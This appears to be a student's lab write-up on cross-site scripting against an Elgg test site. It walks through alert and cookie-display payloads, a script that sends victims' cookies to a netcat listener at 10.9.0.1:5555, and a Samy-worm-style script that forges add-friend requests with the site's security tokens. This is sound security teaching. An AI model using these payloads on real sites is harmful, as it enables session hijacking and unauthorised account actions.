# Work on week #10

## Task 1

* In this first task we want to post a malicious message to display an alert window.

* Firstly, we logged in the server as Alice and looked for and editable field for html. Fortunately, the section "About me" allows to do that in the "Edit Profile" page:

![](https://i.imgur.com/AJ39lK2.png)

* Then, we injected the code given in this field:

![](https://i.imgur.com/EufKsqC.png)

* We logged in with other user, in this case as admin, and searched for the Alice's profile page.

![](https://i.imgur.com/36FNRIZ.png)

* When we clicked on her profile an alert window with the message we wrote, which means that our attack was successful:

![](https://i.imgur.com/VePYOAS.png)

## Task 2

 * In task 2 is very similiar to task 1. The only difference is in this task the message is gonna appear like cookie.

 * To do this we have to put this code in about me in our profile (in this case, Alice's profile) and we check with samy's profile alice account and we can saw the message.
 
 ```javascript=
<script>alert(document.cookie);</script>
```
![](https://i.imgur.com/s6qmdss.png)

![](https://i.imgur.com/selmx4P.png)



* The attack is done.


## Task 3

* Our goal on this task 3 is stealing cookies from the victim’s machine. In order to do this, we have to change the "About me" section in our profile (in this case, Alice's profile) for:

```javascript=
<script>document.write(’<img src=http://10.9.0.1:5555?c=’
                       + escape(document.cookie) + ’   >’);
</script>
```

![](https://i.imgur.com/2U6zjtT.png)



* After that we have to use our terminal and run command: **$ nc -lknv 5555** for allow us to see what we are able to steal. The terminal is gonna print out whatever is sent by the client and sends to it everything typed by the user.

![](https://i.imgur.com/Dt1XB8P.png)


* The attack is done.



## Task 4

* In this task, we tried to recreate the famous "Samy Worm" attack that occured in 2005 on MySpace. Firstly, we need to understand how to add a friend in this website. To do so, and thanks to the HTTP tool of Mozila Firefox, we analyse what it is sent when we add someone as a friend. for this, we used the victim's profile:

![](https://i.imgur.com/EXjLta4.png)


* As we can see, this GET method needs to send ID of the user to be added as a friend, the security token (elgg_ts) and another token, the elgg_token.

* So, if we want to make the attack, we need to write a malicious JavaScript script in the Samy's profile, more specifically, in his "About Me" section, with the option "Edit HTML" enabled.

* This is the malicous script to be written to:

> Javascript script:

```javascript=
<script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; ➀
var token="&__elgg_token="+elgg.security.token.__elgg_token; ➁
//Construct the HTTP request to add Samy as a friend.
var sendurl="http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1670502594&__elgg_token=9G_lgRjZAewSEpzeJGa2KA&__elgg_ts=1670502594&__elgg_token=9G_lgRjZAewSEpzeJGa2KA"+ts+token;
//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET", sendurl, true);
Ajax.send();
}
</script>
```

* This script will just make the request instead of "Add friend" button. It is already sending all the tokens needed. Also, it is sending the URL that is sent after the adding friend action occurs, using the Samy's ID (which is 59), with the parameters mentioned before filled correctly.

* And we successfully added on his profile. It is important to note that the section does not change visually, which means the Samy's profiles seems a normal one.

![](https://i.imgur.com/CAhX3S9.png)


* After that, we logged in as the victim and searched for the Samy's profile:

![](https://i.imgur.com/eLBSDJX.png)


* And without clicking in the "Add friend" button, we noticed that victim was already a friend, meaning that the attack was successful:

![](https://i.imgur.com/f3gDP7c.png)

* Finally, we have to answer some questions:

* Question 1: Explain the purpose of Lines ➀ and ➁, why are they needed?

* Question 2: If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?

* Answers:

* Question 1: These 2 lines are important to create the security tokens and session tokens needed to be sent in the URL of "Add friend action". These tokens are used for security purposes and are generated in the moment that the page is loaded, which means that are not constant values. However, if we use these commands, we can get the correct tokens succesfully.

* Question 2: In the described situation, we could not launch a successful attack, because we wouldn't alter the HTML, so no actions and no GET method would occur. And there is not any other field in the user profile where we could alter the HTML. Also, we tried to recreate the attack in the conditions mentioned in the question and the attack failed as predicted:

![](https://i.imgur.com/Tg109n3.png)
